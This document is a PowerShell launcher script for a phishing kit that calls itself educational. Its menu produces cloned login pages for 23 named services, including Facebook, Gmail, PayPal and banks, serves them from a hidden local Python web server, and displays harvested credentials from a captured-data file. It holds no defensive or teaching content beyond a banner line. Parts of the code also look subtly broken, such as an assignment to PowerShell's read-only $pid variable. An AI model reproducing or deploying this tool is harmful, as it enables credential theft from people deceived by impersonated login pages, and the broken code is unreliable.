# Educational Phishing Tool - PowerShell Version
# Created by: ABID MEHMOOD (The White HAT Hacker)
# Compatible with: PowerShell 5.1+ and PowerShell Core

param(
    [switch]$Help,
    [int]$Port = 8080
)

# Colors for PowerShell
$Colors = @{
    Red = "Red"
    Green = "Green"
    Yellow = "Yellow"
    Blue = "Blue"
    Cyan = "Cyan"
    White = "White"
}

function Show-Banner {
    Clear-Host
    Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║                                                                              ║" -ForegroundColor Cyan
    Write-Host "║    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗                ║" -ForegroundColor Cyan
    Write-Host "║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝                ║" -ForegroundColor Cyan
    Write-Host "║    ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗               ║" -ForegroundColor Cyan
    Write-Host "║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║               ║" -ForegroundColor Cyan
    Write-Host "║    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝               ║" -ForegroundColor Cyan
    Write-Host "║    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                ║" -ForegroundColor Cyan
    Write-Host "║                                                                              ║" -ForegroundColor Cyan
    Write-Host "║                    ████████╗ ██████╗  ██████╗ ██╗                          ║" -ForegroundColor Cyan
    Write-Host "║                    ╚══██╔══╝██╔═══██╗██╔═══██╗██║                          ║" -ForegroundColor Cyan
    Write-Host "║                       ██║   ██║   ██║██║   ██║██║                          ║" -ForegroundColor Cyan
    Write-Host "║                       ██║   ██║   ██║██║   ██║██║                          ║" -ForegroundColor Cyan
    Write-Host "║                       ██║   ╚██████╔╝╚██████╔╝███████╗                     ║" -ForegroundColor Cyan
    Write-Host "║                       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                     ║" -ForegroundColor Cyan
    Write-Host "║                                                                              ║" -ForegroundColor Cyan
    Write-Host "║                     Created by: ABID MEHMOOD                                 ║" -ForegroundColor Cyan
    Write-Host "║                    (The White HAT Hacker)                                   ║" -ForegroundColor Cyan
    Write-Host "║                                                                              ║" -ForegroundColor Cyan
    Write-Host "║                   Educational Cybersecurity Tool                            ║" -ForegroundColor Cyan
    Write-Host "║                  For Learning Phishing Prevention                           ║" -ForegroundColor Cyan
    Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Test-Dependencies {
    Write-Host "[*] Checking dependencies..." -ForegroundColor Yellow
    
    # Check Python
    try {
        $pythonVersion = python --version 2>$null
        if ($pythonVersion) {
            Write-Host "[+] Python found: $pythonVersion" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] Python not found. Please install Python from python.org" -ForegroundColor Red
        return $false
    }
    
    return $false
}

function New-Directories {
    Write-Host "[*] Setting up directory structure..." -ForegroundColor Yellow
    
    $directories = @("templates", "logs", "captured_data", "assets\css", "assets\js", "assets\images")
    
    foreach ($dir in $directories) {
        if (!(Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
    }
    
    Write-Host "[+] Directory structure created" -ForegroundColor Green
}

function Show-Menu {
    Write-Host "╔══════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor White
    Write-Host "║                              MAIN MENU                                      ║" -ForegroundColor White
    Write-Host "╠══════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor White
    Write-Host "║                                                                              ║" -ForegroundColor White
    Write-Host "║  [1]  Facebook Login Page                                                   ║" -ForegroundColor Cyan
    Write-Host "║  [2]  Instagram Login Page                                                  ║" -ForegroundColor Cyan
    Write-Host "║  [3]  Twitter/X Login Page                                                  ║" -ForegroundColor Cyan
    Write-Host "║  [4]  LinkedIn Login Page                                                   ║" -ForegroundColor Cyan
    Write-Host "║  [5]  Gmail Login Page                                                      ║" -ForegroundColor Cyan
    Write-Host "║  [6]  Yahoo Mail Login Page                                                 ║" -ForegroundColor Cyan
    Write-Host "║  [7]  Outlook Login Page                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [8]  PayPal Login Page                                                     ║" -ForegroundColor Cyan
    Write-Host "║  [9]  Amazon Login Page                                                     ║" -ForegroundColor Cyan
    Write-Host "║  [10] eBay Login Page                                                       ║" -ForegroundColor Cyan
    Write-Host "║  [11] Netflix Login Page                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [12] Spotify Login Page                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [13] Apple ID Login Page                                                   ║" -ForegroundColor Cyan
    Write-Host "║  [14] Microsoft Login Page                                                  ║" -ForegroundColor Cyan
    Write-Host "║  [15] GitHub Login Page                                                     ║" -ForegroundColor Cyan
    Write-Host "║  [16] Discord Login Page                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [17] WhatsApp Web Login                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [18] Telegram Web Login                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [19] Steam Login Page                                                      ║" -ForegroundColor Cyan
    Write-Host "║  [20] Dropbox Login Page                                                    ║" -ForegroundColor Cyan
    Write-Host "║  [21] Adobe Login Page                                                      ║" -ForegroundColor Cyan
    Write-Host "║  [22] Banking Login (Generic)                                               ║" -ForegroundColor Cyan
    Write-Host "║  [23] WordPress Login                                                       ║" -ForegroundColor Cyan
    Write-Host "║  [24] Custom Template Creator                                               ║" -ForegroundColor Cyan
    Write-Host "║                                                                              ║" -ForegroundColor White
    Write-Host "║  [25] View Captured Data                                                    ║" -ForegroundColor Yellow
    Write-Host "║  [26] Start Web Server                                                      ║" -ForegroundColor Yellow
    Write-Host "║  [27] Stop Web Server                                                       ║" -ForegroundColor Yellow
    Write-Host "║  [28] View Server Logs                                                      ║" -ForegroundColor Yellow
    Write-Host "║  [99] Exit                                                                  ║" -ForegroundColor Red
    Write-Host "║                                                                              ║" -ForegroundColor White
    Write-Host "╚══════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor White
    Write-Host ""
}

function Start-WebServer {
    Write-Host "[*] Starting web server..." -ForegroundColor Yellow
    
    # Kill any existing Python servers
    Get-Process | Where-Object {$_.ProcessName -eq "python" -and $_.CommandLine -like "*http.server*"} | Stop-Process -Force -ErrorAction SilentlyContinue
    
    # Create templates directory if it doesn't exist
    if (!(Test-Path "templates")) {
        New-Item -ItemType Directory -Path "templates" -Force | Out-Null
    }
    
    # Start Python HTTP server
    try {
        Set-Location "templates"
        $serverProcess = Start-Process -FilePath "python" -ArgumentList "-m", "http.server", $Port -PassThru -WindowStyle Hidden
        Set-Location ".."
        
        # Save PID
        $serverProcess.Id | Out-File "logs\server.pid" -Encoding ASCII
        
        Start-Sleep 2
        
        if (!$serverProcess.HasExited) {
            Write-Host "[+] Web server started on http://localhost:$Port" -ForegroundColor Green
            Write-Host "[*] Server PID: $($serverProcess.Id)" -ForegroundColor Cyan
            Write-Host "[*] Access templates at: http://localhost:$Port/index.html" -ForegroundColor Cyan
            
            # Try to open browser
            try {
                Start-Process "http://localhost:$Port"
            } catch {
                Write-Host "[*] Please manually open: http://localhost:$Port" -ForegroundColor Yellow
            }
        } else {
            Write-Host "[!] Failed to start web server" -ForegroundColor Red
        }
    } catch {
        Write-Host "[!] Error starting server: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Stop-WebServer {
    Write-Host "[*] Stopping web server..." -ForegroundColor Yellow
    
    if (Test-Path "logs\server.pid") {
        $pid = Get-Content "logs\server.pid"
        try {
            Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
            Remove-Item "logs\server.pid" -Force
            Write-Host "[+] Web server stopped" -ForegroundColor Green
        } catch {
            Write-Host "[!] Error stopping server" -ForegroundColor Red
        }
    } else {
        # Kill all Python HTTP servers
        Get-Process | Where-Object {$_.ProcessName -eq "python" -and $_.CommandLine -like "*http.server*"} | Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Web server stopped" -ForegroundColor Green
    }
}

function Show-CapturedData {
    Write-Host "[*] Captured Data:" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor White
    
    if (Test-Path "captured_data\credentials.txt") {
        Get-Content "captured_data\credentials.txt"
    } else {
        Write-Host "[!] No captured data found" -ForegroundColor Red
    }
    
    Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor White
    Write-Host "Press Enter to continue..." -ForegroundColor Cyan
    Read-Host
}

function Show-ServerLogs {
    Write-Host "[*] Server Logs:" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor White
    
    if (Test-Path "logs\server.log") {
        Get-Content "logs\server.log" -Tail 50
    } else {
        Write-Host "[!] No server logs found" -ForegroundColor Red
    }
    
    Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor White
    Write-Host "Press Enter to continue..." -ForegroundColor Cyan
    Read-Host
}

function New-Template {
    param([string]$TemplateName)
    
    Write-Host "[*] Creating $TemplateName template..." -ForegroundColor Yellow
    
    # Call Python script to create template
    try {
        python web_server.py --create-template $TemplateName
        Write-Host "[+] $TemplateName template created" -ForegroundColor Green
        Write-Host "[*] Access at: http://localhost:$Port/$TemplateName.html" -ForegroundColor Cyan
    } catch {
        Write-Host "[!] Error creating template: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Start-Sleep 2
}

# Main execution
function Main {
    if ($Help) {
        Write-Host "Educational Phishing Tool - PowerShell Version" -ForegroundColor Green
        Write-Host "Created by: ABID MEHMOOD (The White HAT Hacker)" -ForegroundColor Green
        Write-Host ""
        Write-Host "Usage: .\phishing_tool.ps1 [-Port <port>] [-Help]" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "Parameters:" -ForegroundColor Yellow
        Write-Host "  -Port    : Specify web server port (default: 8080)" -ForegroundColor Cyan
        Write-Host "  -Help    : Show this help message" -ForegroundColor Cyan
        return
    }
    
    Show-Banner
    Write-Host "[*] Detected OS: Windows (PowerShell)" -ForegroundColor Cyan
    Write-Host "[*] Server Port: $Port" -ForegroundColor Cyan
    
    if (!(Test-Dependencies)) {
        Write-Host "[!] Please install required dependencies first" -ForegroundColor Red
        return
    }
    
    New-Directories
    
    while ($true) {
        Show-Menu
        $choice = Read-Host "Select an option"
        
        switch ($choice) {
            "1" { New-Template "facebook" }
            "2" { New-Template "instagram" }
            "3" { New-Template "twitter" }
            "4" { New-Template "linkedin" }
            "5" { New-Template "gmail" }
            "6" { New-Template "yahoo" }
            "7" { New-Template "outlook" }
            "8" { New-Template "paypal" }
            "9" { New-Template "amazon" }
            "10" { New-Template "ebay" }
            "11" { New-Template "netflix" }
            "12" { New-Template "spotify" }
            "13" { New-Template "apple" }
            "14" { New-Template "microsoft" }
            "15" { New-Template "github" }
            "16" { New-Template "discord" }
            "17" { New-Template "whatsapp" }
            "18" { New-Template "telegram" }
            "19" { New-Template "steam" }
            "20" { New-Template "dropbox" }
            "21" { New-Template "adobe" }
            "22" { New-Template "banking" }
            "23" { New-Template "wordpress" }
            "24" { 
                $customName = Read-Host "Enter custom template name"
                New-Template $customName
            }
            "25" { Show-CapturedData }
            "26" { Start-WebServer }
            "27" { Stop-WebServer }
            "28" { Show-ServerLogs }
            "99" {
                Write-Host "[*] Exiting... Stay safe!" -ForegroundColor Green
                Stop-WebServer
                exit 0
            }
            default {
                Write-Host "[!] Invalid option. Please try again." -ForegroundColor Red
                Start-Sleep 1
            }
        }
    }
}

# Run main function
Main